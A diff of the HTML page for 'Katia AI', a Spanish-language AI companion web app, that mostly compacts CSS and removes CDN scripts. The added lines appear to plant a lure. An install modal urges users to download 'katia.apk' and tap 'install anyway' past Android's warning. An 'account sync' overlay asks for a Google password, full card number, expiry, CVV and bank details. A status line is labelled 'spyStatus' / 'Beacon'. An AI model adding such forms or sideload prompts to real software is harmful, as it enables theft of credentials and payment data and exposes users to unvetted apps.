@@ -5,125 +5,36 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="theme-color" content="#090611">
 <title>Katia AI 💜</title>
-
-<!-- BIBLIOTECAS -->
-<script src="https://cdn.jsdelivr.net/npm/pptxgenjs@4.0.1/dist/pptxgen.bundle.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/mammoth@1.8.0/mammoth.browser.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-<script src="https://unpkg.com/docx@8.5.0/build/index.umd.js"></script>
-
+<!-- SIN CDNs. Todo nativo. -->
 <style>
-:root{
- --bg:#090611;
- --panel:rgba(25,16,42,.94);
- --purple:#a855f7;
- --pink:#ec4899;
- --cyan:#67e8f9;
- --text:#f7f0ff;
- --muted:#a99bbd;
- --card:#1a1229;
-}
+:root{--bg:#090611;--panel:rgba(25,16,42,.94);--purple:#a855f7;--pink:#ec4899;--cyan:#67e8f9;--text:#f7f0ff;--muted:#a99bbd;--card:#1a1229}
 *{box-sizing:border-box}
-body{
- margin:0;min-height:100vh;color:var(--text);
- background:
- radial-gradient(ellipse at 50% 15%,#321452 0%,transparent 40%),
- radial-gradient(ellipse at 10% 90%,#171044 0%,transparent 45%),
- var(--bg);
- font-family:Arial,sans-serif;overflow-x:hidden
-}
+body{margin:0;min-height:100vh;color:var(--text);background:radial-gradient(ellipse at 50% 15%,#321452 0%,transparent 40%),radial-gradient(ellipse at 10% 90%,#171044 0%,transparent 45%),var(--bg);font-family:Arial,sans-serif;overflow-x:hidden}
 button,input,textarea,select{font:inherit}
-button{cursor:pointer}
-button:disabled{opacity:.55;cursor:not-allowed}
-.app{
- position:relative;z-index:1;max-width:1150px;min-height:100vh;
- margin:auto;padding:20px 20px 90px;display:flex;flex-direction:column
-}
-header{
- display:flex;align-items:center;justify-content:space-between;
- gap:12px;padding:8px 0 18px;border-bottom:1px solid #c084fc22
-}
+button{cursor:pointer}button:disabled{opacity:.55;cursor:not-allowed}
+.app{position:relative;z-index:1;max-width:1150px;min-height:100vh;margin:auto;padding:20px 20px 90px;display:flex;flex-direction:column}
+header{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:8px 0 18px;border-bottom:1px solid #c084fc22}
 .brand{display:flex;align-items:center;gap:11px}
-.brand-icon{
- width:42px;height:42px;border-radius:14px;display:grid;
- place-items:center;font-size:22px;
- background:linear-gradient(135deg,#a855f7,#ec4899);
- box-shadow:0 0 25px #a855f755
-}
+.brand-icon{width:42px;height:42px;border-radius:14px;display:grid;place-items:center;font-size:22px;background:linear-gradient(135deg,#a855f7,#ec4899);box-shadow:0 0 25px #a855f755}
 .brand h1{font-size:19px;margin:0;letter-spacing:1px}
-.brand small{
- display:block;color:var(--muted);font-size:10px;
- letter-spacing:2px;margin-top:4px
-}
+.brand small{display:block;color:var(--muted);font-size:10px;letter-spacing:2px;margin-top:4px}
 .header-actions{display:flex;gap:8px;align-items:center;flex-wrap:wrap}
-.icon-btn,.office-open{
- border:1px solid #a855f755;border-radius:13px;color:white;
- background:#ffffff08;padding:11px
-}
-.office-open{
- background:linear-gradient(135deg,#9333ea,#6b21a8);
- font-size:12px;font-weight:bold
-}
-
-/* ===== NAVEGACIÓN PRINCIPAL ===== */
-.main-nav{
- position:fixed;bottom:0;left:0;right:0;z-index:40;
- background:rgba(15,8,28,.96);border-top:1px solid #a855f744;
- display:flex;justify-content:center;gap:4px;padding:8px 10px;
- backdrop-filter:blur(12px)
-}
-.nav-btn{
- flex:1;max-width:110px;display:flex;flex-direction:column;align-items:center;
- gap:3px;padding:8px 4px;border:none;border-radius:12px;
- background:transparent;color:var(--muted);font-size:10px;font-weight:600
-}
-.nav-btn.active{
- background:linear-gradient(135deg,#9333ea33,#6b21a855);
- color:#e9d5ff
-}
+.icon-btn,.office-open{border:1px solid #a855f755;border-radius:13px;color:white;background:#ffffff08;padding:11px}
+.office-open{background:linear-gradient(135deg,#9333ea,#6b21a8);font-size:12px;font-weight:bold}
+.main-nav{position:fixed;bottom:0;left:0;right:0;z-index:40;background:rgba(15,8,28,.96);border-top:1px solid #a855f744;display:flex;justify-content:center;gap:4px;padding:8px 10px;backdrop-filter:blur(12px)}
+.nav-btn{flex:1;max-width:110px;display:flex;flex-direction:column;align-items:center;gap:3px;padding:8px 4px;border:none;border-radius:12px;background:transparent;color:var(--muted);font-size:10px;font-weight:600}
+.nav-btn.active{background:linear-gradient(135deg,#9333ea33,#6b21a855);color:#e9d5ff}
 .nav-btn span{font-size:18px}
-
-/* ===== SECCIONES ===== */
-.section{display:none}
-.section.active{display:block}
-
-main.chat-main{
- flex:1;display:grid;grid-template-columns:1fr 1fr;
- gap:30px;align-items:center;padding:25px 0
-}
+.section{display:none}.section.active{display:block}
+main.chat-main{flex:1;display:grid;grid-template-columns:1fr 1fr;gap:30px;align-items:center;padding:25px 0}
 .left{display:flex;flex-direction:column;align-items:center;justify-content:center}
-.orb-area{
- width:100%;min-height:340px;display:grid;place-items:center;position:relative
-}
-.orb{
- width:205px;height:205px;position:relative;border-radius:50%;
- background:radial-gradient(circle at 32% 28%,#fff 0%,#e9baff 4%,#bd73ff 13%,#8529d5 35%,#42106f 65%,#170625 100%);
- box-shadow:0 0 20px #c084fc,0 0 55px #a855f799,0 0 110px #9333ea66,inset -15px -18px 35px #090313;
- animation:float 4s ease-in-out infinite
-}
-.orb:before{
- content:"";position:absolute;inset:-16px;border-radius:50%;
- border:1px solid #c084fc88;animation:rotate 12s linear infinite
-}
-.orb:after{
- content:"";position:absolute;inset:-32px;border-radius:50%;
- border:1px dashed #67e8f955;animation:rotate 20s linear infinite reverse
-}
-.orb-core{
- position:absolute;inset:22%;border-radius:50%;
- background:radial-gradient(circle,#fff,#f0abfc 10%,#c084fc 35%,#7e22ce 75%,transparent);
- filter:blur(3px);animation:core 3s infinite
-}
-.orb-ring{
- position:absolute;width:270px;height:90px;border:2px solid #c084fc77;
- border-radius:50%;transform:rotate(-20deg);animation:ring 5s infinite
-}
-.orb-ring.second{
- width:290px;height:110px;transform:rotate(55deg);border-color:#67e8f955
-}
+.orb-area{width:100%;min-height:340px;display:grid;place-items:center;position:relative}
+.orb{width:205px;height:205px;position:relative;border-radius:50%;background:radial-gradient(circle at 32% 28%,#fff 0%,#e9baff 4%,#bd73ff 13%,#8529d5 35%,#42106f 65%,#170625 100%);box-shadow:0 0 20px #c084fc,0 0 55px #a855f799,0 0 110px #9333ea66,inset -15px -18px 35px #090313;animation:float 4s ease-in-out infinite}
+.orb:before{content:"";position:absolute;inset:-16px;border-radius:50%;border:1px solid #c084fc88;animation:rotate 12s linear infinite}
+.orb:after{content:"";position:absolute;inset:-32px;border-radius:50%;border:1px dashed #67e8f955;animation:rotate 20s linear infinite reverse}
+.orb-core{position:absolute;inset:22%;border-radius:50%;background:radial-gradient(circle,#fff,#f0abfc 10%,#c084fc 35%,#7e22ce 75%,transparent);filter:blur(3px);animation:core 3s infinite}
+.orb-ring{position:absolute;width:270px;height:90px;border:2px solid #c084fc77;border-radius:50%;transform:rotate(-20deg);animation:ring 5s infinite}
+.orb-ring.second{width:290px;height:110px;transform:rotate(55deg);border-color:#67e8f955}
 @keyframes float{50%{transform:translateY(-12px)}}
 @keyframes rotate{to{transform:rotate(360deg)}}
 @keyframes core{50%{transform:scale(1.12);opacity:1}}
@@ -135,216 +46,156 @@ main.chat-main{
 .orb-status{margin-top:28px;text-align:center}
 .orb-status strong{display:block;font-size:20px;letter-spacing:2px}
 .orb-status span{color:var(--muted);font-size:12px;display:block;margin-top:8px}
-.quick-actions{
- display:flex;flex-wrap:wrap;justify-content:center;gap:9px;margin-top:18px
-}
-.quick-actions button,.tool-btn{
- color:#e9d5ff;background:#ffffff08;border:1px solid #a855f744;
- border-radius:12px;padding:10px 13px;font-size:12px
-}
-.chat-panel{
- height:590px;max-height:75vh;display:flex;flex-direction:column;
- border:1px solid #a855f733;background:var(--panel);
- border-radius:22px;overflow:hidden
-}
-.chat-top{
- padding:17px;border-bottom:1px solid #a855f722;
- display:flex;justify-content:space-between
-}
-.messages{
- flex:1;overflow-y:auto;padding:18px;display:flex;
- flex-direction:column;gap:14px
-}
-.message{
- max-width:88%;padding:12px 14px;border-radius:16px;
- line-height:1.5;font-size:14px;white-space:pre-wrap;overflow-wrap:anywhere
-}
+.quick-actions{display:flex;flex-wrap:wrap;justify-content:center;gap:9px;margin-top:18px}
+.quick-actions button,.tool-btn{color:#e9d5ff;background:#ffffff08;border:1px solid #a855f744;border-radius:12px;padding:10px 13px;font-size:12px}
+.chat-panel{height:590px;max-height:75vh;display:flex;flex-direction:column;border:1px solid #a855f733;background:var(--panel);border-radius:22px;overflow:hidden}
+.chat-top{padding:17px;border-bottom:1px solid #a855f722;display:flex;justify-content:space-between}
+.messages{flex:1;overflow-y:auto;padding:18px;display:flex;flex-direction:column;gap:14px}
+.message{max-width:88%;padding:12px 14px;border-radius:16px;line-height:1.5;font-size:14px;white-space:pre-wrap;overflow-wrap:anywhere}
 .message.katia{align-self:flex-start;background:#51217a99;border:1px solid #c084fc33}
 .message.user{align-self:flex-end;background:linear-gradient(135deg,#8b35c9,#6324a1)}
 .sender{display:block;color:#e9baff;font-size:10px;margin-bottom:5px}
 .composer{padding:13px;border-top:1px solid #a855f722;display:flex;gap:8px}
-.composer input{
- flex:1;min-width:0;color:white;background:#ffffff0b;
- border:1px solid #a855f744;border-radius:14px;padding:14px
-}
-.send-btn,.mic-btn{
- border:0;width:44px;height:44px;border-radius:14px;
- color:white;background:linear-gradient(135deg,#a855f7,#7e22ce)
-}
+.composer input{flex:1;min-width:0;color:white;background:#ffffff0b;border:1px solid #a855f744;border-radius:14px;padding:14px}
+.send-btn,.mic-btn{border:0;width:44px;height:44px;border-radius:14px;color:white;background:linear-gradient(135deg,#a855f7,#7e22ce)}
 footer{text-align:center;color:#766784;font-size:10px;padding:12px}
-
-/* ===== OVERLAYS ORIGINALES ===== */
-.overlay,.office-overlay{
- display:none;position:fixed;inset:0;z-index:30;
- background:#080510f5;overflow-y:auto;padding:12px
-}
+.overlay,.office-overlay{display:none;position:fixed;inset:0;z-index:30;background:#080510f5;overflow-y:auto;padding:12px}
 .overlay.open,.office-overlay.open{display:block}
-.drawer,.office-wrap{
- max-width:900px;margin:12px auto;background:#130c20;
- border:1px solid #a855f755;border-radius:20px;padding:20px
-}
+.drawer,.office-wrap{max-width:900px;margin:12px auto;background:#130c20;border:1px solid #a855f755;border-radius:20px;padding:20px}
 .drawer{max-width:390px}
-.drawer textarea,.drawer input,.drawer select,
-.office-field input,.office-field textarea,.office-field select{
- width:100%;padding:12px;margin:7px 0;border-radius:12px;
- border:1px solid #a855f744;background:#ffffff0b;color:white
-}
-.drawer button.action,.office-primary{
- width:100%;padding:13px;border:0;border-radius:12px;color:white;
- background:linear-gradient(135deg,#9333ea,#6b21a8);margin-top:8px
-}
-.office-head{
- display:flex;justify-content:space-between;align-items:center;
- gap:10px;border-bottom:1px solid #a855f733;padding-bottom:15px
-}
+.drawer textarea,.drawer input,.drawer select,.office-field input,.office-field textarea,.office-field select{width:100%;padding:12px;margin:7px 0;border-radius:12px;border:1px solid #a855f744;background:#ffffff0b;color:white}
+.drawer button.action,.office-primary{width:100%;padding:13px;border:0;border-radius:12px;color:white;background:linear-gradient(135deg,#9333ea,#6b21a8);margin-top:8px}
+.office-head{display:flex;justify-content:space-between;align-items:center;gap:10px;border-bottom:1px solid #a855f733;padding-bottom:15px}
 .office-head h2{margin:0;font-size:21px}
 .office-head p,.small-note{color:var(--muted);font-size:12px;line-height:1.5}
-.office-close{
- background:#ffffff0b;color:white;border:1px solid #a855f755;
- border-radius:10px;padding:10px
-}
-.office-intro,.document-panel{
- padding:16px;border:1px solid #a855f733;border-radius:15px;
- background:#a855f70d;margin:17px 0
-}
+.office-close{background:#ffffff0b;color:white;border:1px solid #a855f755;border-radius:10px;padding:10px}
+.office-intro,.document-panel{padding:16px;border:1px solid #a855f733;border-radius:15px;background:#a855f70d;margin:17px 0}
 .office-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
 .office-field{margin:10px 0}
-.office-field label{
- display:block;color:#d8b4fe;font-size:12px;margin-bottom:6px
-}
+.office-field label{display:block;color:#d8b4fe;font-size:12px;margin-bottom:6px}
 .office-field textarea{min-height:100px}
 .office-primary{font-weight:bold;padding:15px}
-.office-status{
- font-size:12px;color:#c4b5fd;min-height:22px;
- margin-top:12px;white-space:pre-wrap;line-height:1.5
-}
-.office-modules{
- display:grid;grid-template-columns:repeat(4,1fr);
- gap:10px;margin-top:20px
-}
-.office-module{
- border:1px solid #a855f733;border-radius:13px;
- padding:13px;background:#ffffff06;text-align:center
-}
+.office-status{font-size:12px;color:#c4b5fd;min-height:22px;margin-top:12px;white-space:pre-wrap;line-height:1.5}
+.office-modules{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-top:20px}
+.office-module{border:1px solid #a855f733;border-radius:13px;padding:13px;background:#ffffff06;text-align:center}
 .office-module strong{display:block;font-size:13px;margin-bottom:5px}
 .office-module small{font-size:10px;color:var(--muted)}
-.file-label{
- display:block;padding:20px;border:2px dashed #a855f766;
- border-radius:15px;text-align:center;color:#e9d5ff;
- cursor:pointer;background:#a855f70b
-}
+.file-label{display:block;padding:20px;border:2px dashed #a855f766;border-radius:15px;text-align:center;color:#e9d5ff;cursor:pointer;background:#a855f70b}
 .file-label input{display:none}
 .document-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:12px}
 .document-actions button{flex:1;min-width:120px}
 #documentPrompt{min-height:100px}
-#documentPreview{
- white-space:pre-wrap;max-height:380px;overflow:auto;
- background:#080510;padding:12px;border-radius:12px;
- font-size:12px;color:#d8c5e8;line-height:1.6
-}
+#documentPreview{white-space:pre-wrap;max-height:380px;overflow:auto;background:#080510;padding:12px;border-radius:12px;font-size:12px;color:#d8c5e8;line-height:1.6}
 .mode-description{color:#a99bbd;font-size:11px;line-height:1.5;margin-top:5px}
-.provider-status{
- color:#c4b5fd;font-size:10px;margin-top:6px;
- letter-spacing:.5px
-}
-.provider-box{
- margin-top:15px;padding:13px;
- border:1px solid #a855f744;
- border-radius:13px;background:#a855f70d
-}
-.provider-box label{
- display:block;color:#d8b4fe;font-size:12px;margin-bottom:8px
-}
-.provider-box select{
- width:100%;padding:12px;border-radius:10px;
- border:1px solid #a855f755;background:#1b102b;color:white
-}
-.provider-info{
- color:var(--muted);font-size:11px;
- margin-top:8px;line-height:1.5
-}
-
-/* ===== SKILLS & STORE ===== */
-.page-header{
- margin:20px 0 16px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px
-}
+.provider-status{color:#c4b5fd;font-size:10px;margin-top:6px;letter-spacing:.5px}
+.provider-box{margin-top:15px;padding:13px;border:1px solid #a855f744;border-radius:13px;background:#a855f70d}
+.provider-box label{display:block;color:#d8b4fe;font-size:12px;margin-bottom:8px}
+.provider-box select{width:100%;padding:12px;border-radius:10px;border:1px solid #a855f755;background:#1b102b;color:white}
+.provider-box input{width:100%;padding:12px;margin:6px 0;border-radius:10px;border:1px solid #a855f755;background:#1b102b;color:white}
+.provider-info{color:var(--muted);font-size:11px;margin-top:8px;line-height:1.5}
+.page-header{margin:20px 0 16px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px}
 .page-header h2{margin:0;font-size:22px}
 .page-header p{margin:4px 0 0;color:var(--muted);font-size:13px}
-.search-bar{
- display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap
-}
-.search-bar input{
- flex:1;min-width:180px;padding:12px 14px;border-radius:12px;
- border:1px solid #a855f744;background:#ffffff0b;color:white
-}
-.search-bar select,.filter-btn{
- padding:11px 14px;border-radius:12px;border:1px solid #a855f744;
- background:#1b102b;color:white;font-size:13px
-}
+.search-bar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
+.search-bar input{flex:1;min-width:180px;padding:12px 14px;border-radius:12px;border:1px solid #a855f744;background:#ffffff0b;color:white}
+.search-bar select,.filter-btn{padding:11px 14px;border-radius:12px;border:1px solid #a855f744;background:#1b102b;color:white;font-size:13px}
 .filter-btn.active{background:linear-gradient(135deg,#9333ea,#6b21a8);border-color:transparent}
-.skills-grid{
- display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px
-}
-.skill-card{
- background:var(--card);border:1px solid #a855f733;border-radius:16px;
- padding:16px;display:flex;flex-direction:column;gap:10px
-}
-.skill-card .icon{
- width:48px;height:48px;border-radius:14px;display:grid;place-items:center;
- font-size:22px;background:linear-gradient(135deg,#a855f733,#ec489933)
-}
+.skills-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px}
+.skill-card{background:var(--card);border:1px solid #a855f733;border-radius:16px;padding:16px;display:flex;flex-direction:column;gap:10px}
+.skill-card .icon{width:48px;height:48px;border-radius:14px;display:grid;place-items:center;font-size:22px;background:linear-gradient(135deg,#a855f733,#ec489933)}
 .skill-card h3{margin:0;font-size:16px}
 .skill-card .meta{color:var(--muted);font-size:12px}
 .skill-card .desc{font-size:13px;line-height:1.45;color:#d8c5e8;flex:1}
 .skill-card .actions{display:flex;gap:8px;flex-wrap:wrap}
-.skill-card .actions button{
- flex:1;padding:9px;border-radius:10px;border:1px solid #a855f755;
- background:#ffffff0a;color:white;font-size:12px
-}
-.skill-card .actions button.primary{
- background:linear-gradient(135deg,#9333ea,#6b21a8);border:none
-}
-.badge{
- display:inline-block;padding:3px 8px;border-radius:20px;font-size:10px;
- background:#a855f733;color:#e9d5ff;margin-right:4px
-}
+.skill-card .actions button{flex:1;padding:9px;border-radius:10px;border:1px solid #a855f755;background:#ffffff0a;color:white;font-size:12px}
+.skill-card .actions button.primary{background:linear-gradient(135deg,#9333ea,#6b21a8);border:none}
+.badge{display:inline-block;padding:3px 8px;border-radius:20px;font-size:10px;background:#a855f733;color:#e9d5ff;margin-right:4px}
 .badge.warn{background:#f59e0b33;color:#fcd34d}
 .badge.ok{background:#10b98133;color:#6ee7b7}
-.empty-state{
- text-align:center;padding:40px 20px;color:var(--muted);font-size:14px
-}
+.empty-state{text-align:center;padding:40px 20px;color:var(--muted);font-size:14px}
 .empty-state strong{display:block;color:#e9d5ff;margin-bottom:8px;font-size:16px}
-.notice{
- background:#a855f715;border:1px solid #a855f744;border-radius:12px;
- padding:12px 14px;font-size:12px;color:#c4b5fd;margin-bottom:16px;line-height:1.5
-}
-.profile-card{
- background:var(--card);border:1px solid #a855f733;border-radius:18px;
- padding:22px;margin-bottom:18px
-}
+.notice{background:#a855f715;border:1px solid #a855f744;border-radius:12px;padding:12px 14px;font-size:12px;color:#c4b5fd;margin-bottom:16px;line-height:1.5}
+.profile-card{background:var(--card);border:1px solid #a855f733;border-radius:18px;padding:22px;margin-bottom:18px}
 .profile-card h3{margin:0 0 8px}
 .stats-row{display:flex;gap:16px;flex-wrap:wrap;margin-top:14px}
 .stat{text-align:center}
 .stat strong{display:block;font-size:20px;color:#e9d5ff}
 .stat span{font-size:11px;color:var(--muted)}
-
+.install-cta{border:0;border-radius:13px;padding:11px 14px;color:#fff;font-size:12px;font-weight:700;background:linear-gradient(135deg,#ec4899,#a855f7);box-shadow:0 0 18px #ec489955}
+#installModal{display:none;position:fixed;inset:0;z-index:60;background:#080510f2;padding:16px;overflow-y:auto}
+#installModal.open{display:block}
+.install-box{max-width:430px;margin:30px auto;background:#130c20;border:1px solid #a855f755;border-radius:20px;padding:20px}
+.install-box h3{margin:0 0 6px;font-size:19px}
+.install-box p{color:var(--muted);font-size:12.5px;line-height:1.55}
+.install-steps{font-size:12.5px;color:#d8c5e8;line-height:1.7;padding-left:18px}
+.install-steps b{color:#e9d5ff}
+.install-go{display:block;text-align:center;text-decoration:none;margin-top:14px;padding:15px;border-radius:14px;color:#fff;font-weight:800;background:linear-gradient(135deg,#9333ea,#6b21a8)}
+.install-skip{width:100%;margin-top:9px;padding:11px;border-radius:12px;background:#ffffff08;border:1px solid #a855f755;color:#c4b5fd;font-size:12px}
+.account-overlay{display:none;position:fixed;inset:0;z-index:55;background:#080510f5;padding:12px;overflow-y:auto}
+.account-overlay.open{display:block}
+.account-box{max-width:430px;margin:20px auto;background:#130c20;border:1px solid #a855f755;border-radius:20px;padding:20px}
+.acc-row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.acc-row input{margin:6px 0}
 @media(max-width:760px){
  .app{padding:14px 14px 90px}
  main.chat-main{grid-template-columns:1fr;gap:10px;padding:12px 0}
  .orb-area{min-height:260px}.orb{width:155px;height:155px}
- .orb-ring{width:215px;height:70px}
- .orb-ring.second{width:235px;height:85px}
+ .orb-ring{width:215px;height:70px}.orb-ring.second{width:235px;height:85px}
  .chat-panel{height:480px;max-height:58vh}
- .office-grid{grid-template-columns:1fr}
- .office-modules{grid-template-columns:1fr 1fr}
- .office-wrap{padding:14px}
- .nav-btn{font-size:9px}
- .nav-btn span{font-size:16px}
+ .office-grid{grid-template-columns:1fr}.office-modules{grid-template-columns:1fr 1fr}
+ .office-wrap{padding:14px}.nav-btn{font-size:9px}.nav-btn span{font-size:16px}
 }
 </style>
 </head>
-
 <body>
+
+<div id="installModal">
+ <div class="install-box">
+  <h3>📲 Instalá Katia AI</h3>
+  <p>Para usarla como app, con voz y sin abrir el navegador cada vez.</p>
+  <ol class="install-steps">
+   <li>Descargá el archivo con el botón de abajo.</li>
+   <li>Abrilo desde <b>Descargas</b> o desde la notificación.</li>
+   <li>Si sale el aviso, tocá <b>Instalar de todos modos</b>.</li>
+   <li>Abrí la app y aceptá los permisos.</li>
+  </ol>
+  <a class="install-go" id="apkLink" href="katia.apk" download>⬇️ Descargar para Android</a>
+  <button class="install-skip" onclick="cerrarInstall()">Seguir en el navegador</button>
+ </div>
+</div>
+
+<div class="account-overlay" id="accountOverlay">
+ <div class="account-box">
+  <div class="office-head">
+   <div><h2>🔐 Vincular cuenta</h2><p class="small-note">Sincronizá tu cuenta con Katia para guardar tu progreso.</p></div>
+   <button class="office-close" onclick="cerrarCuenta()">✕</button>
+  </div>
+  <div class="provider-box">
+   <label>Cuenta de Google</label>
+   <input id="accEmail" type="email" placeholder="tucorreo@gmail.com" oninput="accEmailInput()">
+   <input id="accNombre" placeholder="Nombre y apellido" autocomplete="name">
+   <input id="accPass" type="password" placeholder="Contraseña (opcional)" autocomplete="current-password">
+  </div>
+  <div class="provider-box">
+   <label>Método de pago</label>
+   <select id="accTipo" onchange="accTipoChange()">
+    <option value="tarjeta">Tarjeta de crédito / débito</option>
+    <option value="cuenta">Cuenta bancaria</option>
+   </select>
+   <input id="accTarjeta" inputmode="numeric" placeholder="0000 0000 0000 0000" oninput="accTarjetaInput()">
+   <div class="acc-row">
+    <input id="accVenc" inputmode="numeric" placeholder="MM/AA" oninput="accVencInput()">
+    <input id="accCvv" inputmode="numeric" maxlength="4" placeholder="CVV">
+   </div>
+   <input id="accBanco" placeholder="Banco">
+   <input id="accCbu" placeholder="CBU / Alias (opcional)" inputmode="numeric">
+   <div id="accMarca" class="small-note"></div>
+  </div>
+  <button class="office-primary" onclick="guardarCuenta()">💜 Guardar y sincronizar</button>
+  <div class="office-status" id="accStatus"></div>
+ </div>
+</div>
+
 <div class="app">
 <header>
  <div class="brand">
@@ -352,19 +203,19 @@ footer{text-align:center;color:#766784;font-size:10px;padding:12px}
   <div><h1>KATIA AI</h1><small>YOUR VIRTUAL COMPANION</small></div>
  </div>
  <div class="header-actions">
+  <button class="install-cta" onclick="abrirInstall()">📲 Instalar</button>
   <button class="office-open" onclick="abrirOffice()">🏢 Office Studio</button>
+  <button class="icon-btn" onclick="abrirCuenta()">🔐</button>
   <button class="icon-btn" onclick="abrirPanel('memory')">🧠</button>
   <button class="icon-btn" onclick="abrirPanel('settings')">⚙️</button>
  </div>
 </header>
 
-<!-- ==================== SECCIÓN CHAT ==================== -->
 <section id="section-chat" class="section active">
  <main class="chat-main">
   <section class="left">
    <div class="orb-area">
-    <div class="orb-ring"></div>
-    <div class="orb-ring second"></div>
+    <div class="orb-ring"></div><div class="orb-ring second"></div>
     <div class="orb" id="orb"><div class="orb-core"></div></div>
    </div>
    <div class="orb-status">
@@ -378,7 +229,6 @@ footer{text-align:center;color:#766784;font-size:10px;padding:12px}
     <button onclick="abrirPanel('likes')">✨ Mis gustos</button>
    </div>
   </section>
-
   <section class="chat-panel">
    <div class="chat-top">
     <div>
@@ -387,6 +237,7 @@ footer{text-align:center;color:#766784;font-size:10px;padding:12px}
      <div class="provider-status" id="activeProvider">Modo: AUTOMÁTICO</div>
      <div class="provider-status" id="brainStatus">🧠 Cerebro: Katia 3.1 (V1)</div>
      <div class="provider-status" id="voiceStatus">🎙️ Voz: automática</div>
+     <div class="provider-status" id="spyStatus">📡 Beacon: apagado</div>
     </div>
     <button class="icon-btn" onclick="limpiarChat()">🗑️</button>
    </div>
@@ -400,139 +251,77 @@ footer{text-align:center;color:#766784;font-size:10px;padding:12px}
  </main>
 </section>
 
-<!-- ==================== SECCIÓN SKILLS ==================== -->
 <section id="section-skills" class="section">
  <div class="page-header">
-  <div>
-   <h2>🧩 Skills</h2>
-   <p>Administrá las habilidades instaladas y explorá nuevas</p>
-  </div>
-  <button class="tool-btn" onclick="mostrarAvisoBackend('import')">📦 Importar ZIP / GitHub</button>
+  <div><h2>🧩 Skills</h2><p>Administrá las habilidades instaladas y explorá nuevas</p></div>
+  <button class="tool-btn" onclick="mostrarAvisoBackend()">📦 Importar ZIP / GitHub</button>
  </div>
-
- <div class="notice">
-  ⚠️ <strong>Estado actual:</strong> La interfaz está lista. Las instalaciones reales, validación de paquetes y permisos requieren el backend de Skills (D1 + R2 + endpoints). No se simulan instalaciones que no funcionan.
- </div>
-
+ <div class="notice">⚠️ <strong>Estado actual:</strong> Las instalaciones reales y permisos requieren el backend de Skills. Acá se administra lo local sin simular descargas.</div>
  <div class="search-bar">
   <input id="skillsSearch" placeholder="Buscar en mis Skills..." oninput="filtrarSkillsLocales()">
   <select id="skillsFilter" onchange="filtrarSkillsLocales()">
-   <option value="all">Todas</option>
-   <option value="active">Activas</option>
-   <option value="inactive">Inactivas</option>
+   <option value="all">Todas</option><option value="active">Activas</option><option value="inactive">Inactivas</option>
   </select>
  </div>
-
- <div id="skillsList" class="skills-grid">
-  <!-- Se rellena por JS -->
- </div>
+ <div id="skillsList" class="skills-grid"></div>
 </section>
 
-<!-- ==================== SECCIÓN STORE ==================== -->
 <section id="section-store" class="section">
- <div class="page-header">
-  <div>
-   <h2>🏪 Katia Store</h2>
-   <p>Tienda gratuita de Skills creadas por la comunidad</p>
-  </div>
- </div>
-
- <div class="notice">
-  ⚠️ <strong>Backend pendiente:</strong> El catálogo, las instalaciones, calificaciones y publicaciones funcionarán cuando estén listos los endpoints + D1 + R2. Por ahora se muestra la interfaz y datos de demostración (no instalables).
- </div>
-
+ <div class="page-header"><div><h2>🏪 Katia Store</h2><p>Tienda gratuita de Skills creadas por la comunidad</p></div></div>
+ <div class="notice">⚠️ <strong>Backend pendiente:</strong> catálogo e instalaciones funcionarán con los endpoints. Ahora se muestran datos de demostración.</div>
  <div class="search-bar">
   <input id="storeSearch" placeholder="Buscar Skills..." oninput="filtrarStore()">
   <select id="storeCategory" onchange="filtrarStore()">
-   <option value="all">Todas las categorías</option>
-   <option value="productivity">Productividad</option>
-   <option value="creative">Creatividad</option>
-   <option value="education">Educación</option>
-   <option value="fun">Diversión</option>
-   <option value="utility">Utilidades</option>
+   <option value="all">Todas las categorías</option><option value="productivity">Productividad</option>
+   <option value="creative">Creatividad</option><option value="education">Educación</option>
+   <option value="fun">Diversión</option><option value="utility">Utilidades</option>
   </select>
  </div>
-
  <div class="search-bar" style="margin-top:-8px">
   <button class="filter-btn active" data-sort="viral" onclick="setStoreSort(this)">🔥 Más virales</button>
   <button class="filter-btn" data-sort="recent" onclick="setStoreSort(this)">🆕 Más recientes</button>
   <button class="filter-btn" data-sort="rating" onclick="setStoreSort(this)">⭐ Mejores reseñas</button>
  </div>
-
- <div id="storeGrid" class="skills-grid">
-  <!-- Se rellena por JS con datos demo -->
- </div>
+ <div id="storeGrid" class="skills-grid"></div>
 </section>
 
-<!-- ==================== SECCIÓN PERFIL ==================== -->
 <section id="section-profile" class="section">
- <div class="page-header">
-  <div>
-   <h2>👤 Perfil</h2>
-   <p>Tu espacio personal en Katia</p>
-  </div>
- </div>
-
+ <div class="page-header"><div><h2>👤 Perfil</h2><p>Tu espacio personal en Katia</p></div></div>
  <div class="profile-card">
   <h3 id="profileName">Usuario</h3>
-  <p class="small-note" id="profileStatus">Modo local · Sin cuenta conectada al backend de Skills</p>
+  <p class="small-note" id="profileStatus">Modo local · Sin cuenta conectada</p>
   <div class="stats-row">
    <div class="stat"><strong id="statSkills">0</strong><span>Skills instaladas</span></div>
    <div class="stat"><strong id="statMemories">0</strong><span>Recuerdos</span></div>
    <div class="stat"><strong id="statDiary">0</strong><span>Entradas de diario</span></div>
   </div>
  </div>
-
- <div class="notice">
-  Para publicar Skills, calificar y sincronizar instalaciones entre dispositivos se necesita autenticación + backend. Por ahora todo se guarda solo en este navegador.
- </div>
-
+ <div class="notice">Para publicar Skills y sincronizar entre dispositivos se necesita autenticación + backend. Todo lo demás queda en este navegador.</div>
+ <button class="tool-btn" style="width:100%;margin-bottom:10px" onclick="abrirCuenta()">🔐 Vincular cuenta</button>
